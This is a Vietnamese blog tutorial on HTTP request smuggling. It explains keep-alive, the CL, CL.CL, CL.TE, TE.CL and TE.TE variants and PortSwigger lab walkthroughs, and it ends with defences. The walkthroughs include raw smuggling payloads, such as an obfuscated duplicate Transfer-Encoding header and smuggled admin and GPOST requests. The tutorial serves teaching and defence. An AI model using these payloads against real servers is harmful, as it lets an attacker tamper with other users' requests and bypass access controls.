<p>Hình trên là miêu tả các thành phần của một request, reponse chỉ hơi khác một chút , bây giờ mình cùng xem qua quy trình một gói request được xử lí nào !</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Nhìn vào dòng request line ta sẽ thấy được server đang sử dụng giao thức HTTP/1.1 . Hiện nay  mặc dù Htpp/2 đã ra mắt để dần thay thế nó hay thậm chí Http/3 cũng được đề cập đến nhưng version này vẫn được sử dụng rất phổ biến rất , nó là bản nâng cấp của Http/1.0 với một tính năng mới cực kì hiệu quả cho việc truyền tải là 2 ae <code>Keep-Alive và Pipeline</code>. Để biết rõ về khác biệt giữa các version này là gì các bạn có thể tham khảo <a rel="noreferrer noopener" href="https://kipalog.com/posts/Luoc-su-tu-HTTP-1-toi-HTTP-2-va-tuong-lai-cua-HTTP" target="_blank">bài viết</a> này. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Một trong những vấn đề của Http 1.0 đó chính là chỉ có thể một connection tới một tài nguyên dẫn đến hiệu suất thấp và tốn nhiều thời gian,lưu lượng do quá trình bắt tay 3 bước TCP . Vì thế 2 tính năng Keep-Alive và Pipeline đã được thêm vào trong bản Http/1.1 để có thể tạo một connection tải nhiều tài nguyên . Với tính năng Keep-Alive, request sẽ được thêm một header đặc biệt là <code>Connection: Keep-Alive</code> , phía máy chủ sẽ nhận được request và hiểu là không được đóng kết nổi TCP , tương tự phía server sẽ dùng lại cái kết nối TCP này .Như vậy chỉ cần thực hiện một lần bắt tay ba bước , điều này có thể giảm lưu lượng tới máy chủ, tiết kiệm tài nguyên và tăng tốc truy cập. Tính năng này được bật mặc đinh khi sử dụng giao thức Http/1.1.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Đi cùng với Keep-Alive đó là Pipeline, để giải quyết vấn đề lộn xộn khi nhiều request cùng một lúc và thời gian khi phải chờ dợi response của request trước để thực hiện request tiếp theo trong cùng một connection.Http Pipeline sẽ cho phép việc gửi request liên tục mà không cần phải chờ đợi response của request trước nhưng vẫn phải theo tuần tự vào trước thì nhận trước. Tính năng này có một nhược điểm là nếu request trước nhận response chậm thì các request sau cũng phải chờ cho xong mới được nhận response của mình. Nhược điểm này còn có tên là head-of-line blocking, vấn đề này đã được khắc phục ở Http/2 và một biện pháp không liên quan nhưng lại có thể làm người ta quên đi pipeline nữa đó chính là <a rel="noreferrer noopener" href="http://hydrasky.ml/2020/03/web-cache" target="_blank">CACHE</a> (tham khảo bài viết của mình). Cache rất hữu ích vì nó sẽ đưa HRS thành Web Cache Poisoning hehe.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Thực ra chúng ta chỉ cần quan tâm vè Keep-Alive cho lỗ hổng này, còn Pipeline thì không cần thiết vì tính năng này phức tạp,chứa nhược điểm lớn nên bình thường nó ko được dùng và bị disable trên trình duyệt,còn phía server vẫn hỗ trợ cho connection nào cần. Nhưng nói rồi thì nói luôn cho đỡ thắc mắc và mình đỡ quên hehe.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Ok như vậy với tính năng Keep-Alive ,request sẽ được  forward lần lượt đến Back-End Server thông qua Front-End Server (Proxy server, load banacer ) trên cùng một connection TLS/TCP. Ngoài ra khi đến Front-End Server,request cũng sẽ được phân tích để lưu vào cache .</p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":584,"height":328} -->
<figure class="wp-block-image is-resized"><img src="https://portswigger.net/web-security/images/forwarding-http-requests-to-back-end-server.svg" alt="What is HTTP request smuggling? Tutorial &amp; Examples | Web Security ..." width="584" height="328"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Sau khi nhận request Back-End server sẽ phân tích các header của request để xác định khi nào sẽ kết thúc  một request vừa nhận và nhận request tiếp theo.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Lợi dụng điều này Attacker gửi một requets thập cẩm(nhưng có tính toán nha) để  lừa front-end server đó là 1 reuqest hợp lệ và chuyển tiếp đến Back-End. BE said " bạn cho thì mình lấy thôi" , rồi  khi phân tích request  Back-End hiểu lầm là một phần của request thập cẩm đó là điểm bắt đầu và nó sẽ được gộp vào request sau đó (như phích và ổ cắm haha ). </p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://portswigger.net/web-security/images/smuggling-http-request-to-back-end-server.svg" alt="What is HTTP request smuggling? Tutorial &amp; Examples | Web Security ..."/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Sau đó request vẫn được thực hiện một cách hợp lệ response sẽ được trả về  ,như vậy attacker đã can thiệp vào việc xử lí của ứng dụng. =&gt; Smuggling attack !!!</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://memn0ps.github.io/images/2019-09-13-HTTP-Request-Smuggling-CL-TE/screenshot2.png" alt="screenshot2"/><figcaption>Ví dụ minh họa</figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>Cách thức tấn công HTTP request smuggling</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Như mình đã giới thiệu bên trên, HRS lần đầu tiên được đưa ra vào <a rel="noreferrer noopener" href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank">tài liệu</a> năm 2005 bởi Watchfire, trong đó có nhắc đến 2 kiểu được sử dụng là CL và CL.CL, nhưng do nó là kĩ thuật quá khó và chỉ ảnh hưởng đến người dùng nên nó bị bỏ qua.Và đến năm 2019, Jame Kettle đã làm cho nó sống lại với <a rel="noreferrer noopener" href="https://www.youtube.com/watch?v=w-eJM2Pc0KI" target="_blank">HTTP Desync Attacks</a> tại Black Hat và DEF CON cùng với đó là 3 kiểu mới được đưa ra là CL.TE, TE.CL và TE.TE.  Như vậy có thể chia ra làm 5 kiểu : CL, CL.CL, CL.TE, TE.CL và TE.TE, mình sẽ giải thích hết luôn hehe.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>  CL và TE lần lượt viết tắt của <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Length" target="_blank">Content-Length</a> và <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding" target="_blank">Transfer-Encoding</a> là 2 HTTP header . Content-Length cho biết kích thước của body của request, tính bằng byte, được gửi cho người nhận còn Transfer-Encoding chỉ định hình thức mã hóa (gzip, chunked.compress....) được sử dụng để đóng gói vận chuyển phần body một cách nhanh chóng, giải quyết được vấn đề của <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Length" target="_blank">Content-Length</a> với dữ liệu lớn. Nhưng  tính năng quan trọng cần nhớ ở đây là 2 header này còn là cách xác định kết thúc một HTTP message. Đây là mấu chốt để thực hiện HRS ! </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>À còn một vấn đề nữa trước khi vào vấn đề là việc sử dụng các method HTTP (GET , POST, PUT ...) phải hợp lí, không thể dùng bừa bởi vì mỗi methob đều có chức năng riêng và server sẽ xử lí khác nhau. Thế nên nó cũng ảnh hưởng đén việc tấn công bằng HRS,mình sẽ không thể giải thích cả vì nó sẽ quá dài mong các bạn lưu ý cả phần này. OK vào thôi  !</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3><strong>GET Request với CL </strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Trong kiểu này không phải chỉ request GET có thể sử dụng, mình chỉ lấy như một ví dụ vì nó rất là điển hình.&nbsp;Tất cả các yêu cầu HTTP không mang body đều có khả năng làm điều này nhưng mình chưa biết hết hihi.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Trong tài liệu của <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Request_for_Comments" target="_blank">RFC</a> về HTTP/1.1 - <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc2616" target="_blank">RFC2616</a> không có quy định nào đề ra về việc cho phép yêu cầu GET mang thêm Body trong request như request POST và chỉ có một câu được đề cập trong phần 4.3.1 của tài liệu mới nhất của nó là  <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc7231#section-4.3.3" target="_blank">RFC7231</a>.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>Sending a payload body on a GET request might cause some existing implementations to reject the request</p><cite>Gửi payload body trong một Get request có thể là nguyên nhân dẫn đến request bị từ chối thực hiện..</cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Giả sử Front-End Server (Proxy Server) cho phép  GET request mang Body và Back-end Server không cho phép GET request mang Body.&nbsp;Như vậy Back-end Server sẽ  bỏ qua luôn&nbsp;<code>Content-Length</code> header trong request GET và sẽ không xử lý nó.&nbsp;Điều này có thể dẫn đến request Smuggling. Cùng xem ví dụ nha.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 44\r\n # 44 byte

GET / secret HTTP/1.1\r\n #độ dài của đoạn
Host: example.com\r\n     # này bằng 44 byte 
\r\n</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Front-end Server nhận được request và kiểm tra&nbsp;<code>Content-Length</code>, xác định rằng đây là một request hoàn chỉnh và  chuyển tiếp nó đến back-end Server.&nbsp;Sau đó back-end Server nhận được nó, vì nó không xử lý&nbsp;<code>Content-Length</code>,  nên nó nghĩ rằng nó đang nhận được hai request. </p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>First request 
GET / HTTP/1.1\r\n
Host: example.com\r\n

Second request 
GET / secret HTTP/1.1\r\n
Host: example.com\r\n</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Done !!!</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>CL.CL</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Trong mục 4.4 của <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc2616#section-4.4" target="_blank">RFC2616</a> và mục 4 của 3.3.3 trong  <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank">RFC7230</a>, có ghi rằng khi request  mà máy chủ nhận được chứa hai hoặc nhiều hơn Content-Length header và  giá trị của các header này khác nhau thì nó sẽ trả về status code 400 hoặc 502. Như vậy khả năng cáo Server sẽ không chấp nhận request kiểu này và cũng vì thế người ta chỉ coi kiểu này chỉ ở mức ý tưởng. </p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>If a message is received without Transfer-Encoding and with<br>either multiple Content-Length header fields having differing<br>field-values or a single Content-Length header field having an<br>invalid value, then the message framing is invalid and the<br>recipient MUST treat it as an unrecoverable error. If this is a<br>request message, the server MUST respond with a 400 (Bad Request)<br>status code and then close the connection. If this is a response<br>message received by a proxy, the proxy MUST close the connection<br>to the server, discard the received response, and send a 502 (Bad Gateway) response to the client. If this is a response message<br>received by a user agent, the user agent MUST close the<br>connection to the server and discard the received response.</p><cite>Các bạn tự dịch nhé !</cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Nó đã được fix nhưng không sao mình vẫn sẽ trình bày về nó như trong tài liệu của Watchfire sử dụng nó để thực hiện HRS thành công.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Lần này mình lấy ví dụ dùng POST request,không như GET, server sẽ kiểm tra cả CL header để lấy dữ liệu  nhé !</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>POST / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Theo như minh tìm hiểu nếu như sử dụng 2 header CL thì thông thường Proxy Server sẽ lấy Content-Length đầu tiên còn Back-End sẽ phân tích và lấy Content-Length cuối cùng, tại sao thì mình chưa tìm ra nhưng nó không ảnh hưởng lắm nên thôi .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> Lúc này độ dài của dữ liệu mà Proxy Server nhận được là 8 bytes , kiểm tra nội dung "12345\r\na" đã đủ và nó chuyển tiếp request như vậy đến BE server.&nbsp;Khi đến Back-end Server sẽ lấy giá trị của CL header cuối  là 7 bytes . Sau khi đọc 7 ký tự đầu tiên "12345\r\n" (Để lại "a" trong cache huhu), Back-end Server xác định rằng request đã được đọc và kết thúc request (Server sẽ gửi response tương ứng cho request này ).&nbsp;Như vậy cache vẫn còn có giữ chữ "a" thừa từ request trước.&nbsp;Lúc này Back-end Server cho rằng "<code>a"</code>là một phần của request tiếp theo.&nbsp;Nếu như thời điểm này có mình hoặc một người dùng thường khác gửi request đến Server như sau:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>GET /index.html HTTP/1.1\r\n
Host: example.com\r\n</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Như chúng ta đã biết từ trước, các kết nối TCP thường được sử dụng lại giữa máy chủ proxy và máy chủ nguồn. Nên request này sẽ được ghép vào sau  "a" giống như ổ cắm - Jame Kettle nói . Khi đó Back-end Server nhận được request như này :</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>aGET /index.html HTTP/1.1\r\n
Host: example.com\r\n</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Làm gì có method aGET đúng không các bạn ? Server sẽ xử lí và trả về một lỗi tương tự như&nbsp; "aGET request method not found".Như vậy là bạn đã có thể thực hiện một cuộc tấn HRS hay làm ảnh hưởng yêu cầu của người dùng khác và thậm trí mở rộng thành một cuộc tấn công khác như CSRF.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>CL-TE</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p> CL-TE có nghĩa là khi nhận được request có hai header này,  proxy server chỉ xử lý header Content-Length còn Back-End Server phía sau sẽ tuân thủ các quy định về <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc2616" target="_blank">RFC2616</a>, bỏ qua Content -Length, xử lý header Transfer-Encoding.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Transfer-Encoding có thể chỉ định nhiều kiểu mã hóa nhưng chúng ta chỉ cần quan tâm đến chunked -mã hóa kiểu khối .Định dạng dữ liệu chuyển kiểu khối như sau:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>&#91;chunk size]&#91;\r\n]&#91;chunk data]&#91;\r\n]&#91;chunk size]&#91;\r\n]&#91;chunk data]&#91;\r\n]&#91;chunk size = 0]&#91;\r\n]&#91;\r\n]</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p> trong đó giá trị của "size" được biểu thị bằng hệ thập lục phân. Khi chunk size bằng không có nghĩa là kết thúc nội dung của body.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","width":349,"height":380} -->
<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://lh3.googleusercontent.com/proxy/BImzadzTUYQ7CwIpg0EV8EpAxyOQvlEybJun0Ij3NIyg2N1k21fQfUISY4EQy76W_8oLvvMfkYXZXHrvsHGq" alt="HTTP Hyper Text Transfer Protocol (2)" width="349" height="380"/><figcaption>Ví dụ minh họa</figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Mình sẽ sử dụng lab của PortSwigger để làm lấy ví dụ luôn cho sinh động  ( thực tế sẽ khó hơn nhé) cùng với đó mình sẽ sử dụng BurpSuite và extention <a rel="noreferrer noopener" href="https://github.com/PortSwigger/http-request-smuggler" target="_blank">Http request Smuggler</a> của nó (Các bạn tự tìm hiểu nha) :</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noreferrer noopener">Link lab Portswigger</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Đây là request mình sẽ check đầu tiên , cung như là cấu trúc của một packet CL.TE:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":203,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-3.png" alt="" class="wp-image-203"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Vì Front-End Server xử lí  Content-Length, sau khi kiểm tra độ dài của payload body đúng là 36, FE coi đây là một request hoàn chỉnh và forward nó đi. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Chắc chắn sẽ có bạn thắc mắc về độ cài của body của request khi nhận được.Bạn nhìn  và đếm rõ rảng không đủ 36 bytes như content length hiện. Đây là do trong body còn dùng 2 kí tự ngắt dòng là &nbsp;CR (\r)  và LF  (\n), trong các ví dụ hình ảnh mình đưa ra sẽ lược bỏ nó đi cho đỡ rối mắt. :</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">0 \ r \ n
\ r \ n
GET /admin HTTP/1.1</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Tiếp tục,khi gói tin được chuyển đến thì back-end sẽ xử lý&nbsp;<code>Transfer-Encoding</code> header.Nhưng đập vào mắt nó là  "0 \ r \ n", nên Back-end cho rằng đã kết thúc request,để lại đoạn "GET /admin HTTP/1.1" trong cache, chờ đợi request tiếp theo đến. Kết quả trong lab mình thực hiện sẽ như thế này:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":202,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-2.png" alt="" class="wp-image-202"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ok như vậy là đã có dấu hiệu để thực hiện tấn công HRS.  Phân còn lại các bạn nên tự khám phá nha.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>TE.CL</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Khi bạn hiểu được CL.TE rồi thì đối với kiểu này nó cũng tương tự chỉ là đảo vế cho nhau thôi ( FE sẽ xử lí TE còn BE xử lí CL).PortSwigger cũng có lab  tương tự :</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noreferrer noopener">Link lab Portswigger</a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":204,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-4.png" alt="" class="wp-image-204"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Request đến FE và xử lí TE, khi nó đọc dến "0 \ r \ n \ r \ n", nó coi là dã đọc xong, request hoàn chỉnh và  chuyển tiếp đến máyBE  server. BE server xử lý CL,khi nó đọc đến "12 \ r \ n:, nó coi như là request đã kết thúc. Còn phần còn lại thì nó cho là của một yêu cầu khác</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">GPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Và reponse trả về với lỗi dễ hiểu</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":205,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-5.png" alt="" class="wp-image-205"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ok!</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>TE.TE</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Đây kiểu cuối cùng, nó cũng tự như CL.CL là sử dụng 2 header TE trong reuqest nhưng mà nó vẫn chưa rõ quy chế như CL.CL (lỗi 400) trong tài liệu của RFC, nghe đâu đó là nó đang được thực hiện.Tuy nhiên , thực tế FE server và BE server không xử lí giống nhau nên nó sẽ khó hơn CL.CL. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Vì vậy chúng ta cần tìm cách đưa TE.TE về 2 kiểu TE vs CL. Trick được đưa ra trong Portswigger là che dấu header TE, có dùng trong request nhưng không được xử lí.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a rel="noreferrer noopener" href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank">Link Lab PortSwigger</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Trong trương hợp này cả 2 server đều muôn xử lí TE. Như các bạn đã biết TE sẽ có 5 giá trị mặc định (gzip, chunked, identity...), mình sẽ giấu một header bằng cách cho nó giá trị không tồn tại là "cow" và thêm cả CL vào request.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">POST / HTTP/1.1\r\n
Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
Accept-Language: en-US,en;q=0.5\r\n
Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n
Content-length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-encoding: cow\r\n
\r\n
5c\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>FE sẽ xử lí TE đầu tiên, nó kiểm tra đến khi đọc đến "0\r\n\r\n" . Request hoàn chỉnh và forward đến BE. BE xét header TE cuối nhưng có vấn đề và nó chuyển sang xử lí bằng CL. Như vậy trong trường hợp FE cử lí TE đầu tiền còn BE xử lí TE cuối thì ta đã đưa về kiểu TE.CL, còn nếu như FE xử lí TE cuối  còn BE xứ lí TE đầu thì ngược lại.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":208,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-6.png" alt="" class="wp-image-208"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>OK như vậy là mình đã trình bày xong về các kiểu tấn công HRS, bạn không hiểu phần nào hãy để lại comment cho mình.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 id="6-how-to-prevent-http-request-smuggling">Cách ngăn chặn buôn lậu yêu cầu HTTP</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Chúng ta đã biết tác hại của lỗ hổng HTTP request Smuggling và chúng ta sẽ đặt câu hỏi: làm thế nào để ngăn chặn nó?&nbsp;Có ba cách phòng thủ chung (không dành riêng cho một máy chủ cụ thể nào cả nha).</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>Vô hiệu hóa "reuse" sử dụng kết nối TCP - <a rel="noreferrer noopener" href="https://docs.apigee.com/api-platform/antipatterns/disable-persistent-connections" target="_blank">disable kết nối liên tục</a> (keep -alive) giữa proxy server và back-end server</li><li>Sử dụng giao thức HTTP/2. HTTP/2 có cách ngăn chặn HRS bằng các tính năng mới như "Request multiplexing over a single TCP connection, Compression of request headers"</li><li>Máy chủ front và back end  sử dụng cùng một máy chủ hoặc tất cả các máy chủ chạy cùng một phần mềm máy chủ web có cùng cấu hình ( Tránh các phiên bản cho phép lỗ hổng này diễn ra như <a rel="noreferrer noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2018-8004" target="_blank">Apache Traffic Server</a> (ATS) versions 6.0.0 to 6.2.2 and 7.0.0 to 7.1.3 - <a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/" target="_blank" rel="noreferrer noopener">POC</a>).</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Tất nhiên các biện pháp trên chỉ có thể giải quyết vấn đề một cách cơ bản và còn nhiều khiếm khuyết như vô hiệu hóa việc sử dụng lại kết nối TCP giữa máy chủ proxy và máy chủ back-end, điều này sẽ làm tăng áp lực lên  back-end server.&nbsp;Sử dụng HTTP/2 thì không thể được quảng bá trong các điều kiện mạng hiện tại, ngay cả khi máy chủ hỗ trợ giao thức HTTP / 2 tương thích với HTTP / 1.1.&nbsp;Và xét về bản chất, lý do dẫn đến HTTP request Smuggling  không phải là vấn đề thiết kế giao thức mà là vấn đề của việc triển khai máy chủ khác nhau.&nbsp;Cá nhân mình nghĩ rằng giải pháp tốt nhất là thực hiện nghiêm túc theo các tiêu chuẩn quy định trong RFC7230-7235, nhưng đây là điều khó khăn nhất để đạt được.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Cảm ơn các bạn đã đọc , mình rất thích lỗ hổng này nên chắc chắn sẽ có bài viết thêm về nó , mong các bạn đón đọc nha!</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Tài liệu tham khảo</h2>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></li><li><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling</a></li><li><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank" rel="noopener">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></li><li><a href="https://www.pentestpartners.com/security-blog/http-request-smuggling-a-how-to/" target="_blank" rel="noopener">https://www.pentestpartners.com/security-blog/http-request-smuggling-a-how-to/</a></li></ul>
<!-- /wp:list -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/14/HTTP%20Request%20Smuggling%20Attack/" data-id="ckbgpmbd3000zqxjmc6bk0awj" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-Server/" rel="tag">Web Server</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BugBoutyTip/" rel="tag">BugBoutyTip</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-App/" rel="tag">Web App</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-Server/" rel="tag">Web Server</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/BugBoutyTip/" style="font-size: 10px;">BugBoutyTip</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Technology/" style="font-size: 20px;">Technology</a> <a href="/tags/Web-App/" style="font-size: 13.33px;">Web App</a> <a href="/tags/Web-Server/" style="font-size: 16.67px;">Web Server</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/06/15/CROSS%20SIDE%20REQUEST%20FORGERY/">Cross Side Request Forgery</a>
          </li>
        
          <li>
            <a href="/2020/06/14/oath/">Oauth</a>
          </li>
        
          <li>
            <a href="/2020/06/14/Session%20vs%20Token-Based%20Authentication/">Session &amp; Token-Based Authentication</a>
          </li>
        
          <li>
            <a href="/2020/06/14/Cross%20Site%20Scripting%20(Part1)/">Cross Site Scripting (Part 1)</a>
          </li>
        
          <li>
            <a href="/2020/06/14/Host%20Header%20Attack/">Host Header Attack</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>